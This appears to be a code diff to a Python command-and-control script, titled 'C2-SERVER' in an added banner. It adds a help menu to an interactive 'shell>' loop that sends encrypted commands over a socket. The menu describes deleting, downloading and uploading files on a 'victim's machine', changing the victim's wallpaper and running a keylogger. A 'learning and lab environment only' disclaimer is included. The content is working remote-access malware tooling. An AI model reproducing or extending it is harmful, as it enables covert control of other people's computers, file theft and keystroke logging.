@@ -17,7 +17,17 @@ def to_1024(data):
     chunk_size = 1024
     chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
     return chunks
+print("""
+ ██████╗██████╗       ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
+██╔════╝╚════██╗      ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
+██║      █████╔╝█████╗███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
+██║     ██╔═══╝ ╚════╝╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
+╚██████╗███████╗      ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
+ ╚═════╝╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+                                                                       
 
+
+""")
 conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 conn.connect(('192.168.50.200',443))
@@ -38,7 +48,22 @@ if "failed" in response:
 while 1:
     try:
         payload = input("shell> ")
-        if "del" in payload:
+        if payload == "help":
+            print("""
+***This tool is for learning and lab environment only***
+Commands:
+                dir -> shows the current directory info
+                path -> shows the current path
+                ipconfig -> shows network intrfaces information
+                arp -a -> shows arp table
+                del [file name] -> deletes a file on victims machine
+                cd [path] -> changes the directory
+                download [file name] -> downloads a file from victim's machine
+                upload [file name] -> uploads a file to victim's machine
+                wall [file name] -> change victim's wallpaper
+                keylogger [characters to log(number)] [buffer size] -> logs the keys
+""")
+        elif "del" in payload:
             conn.sendall(Encrypt(payload.encode()))
             result = Decrypt(conn.recv(1024))
             print(result.decode())
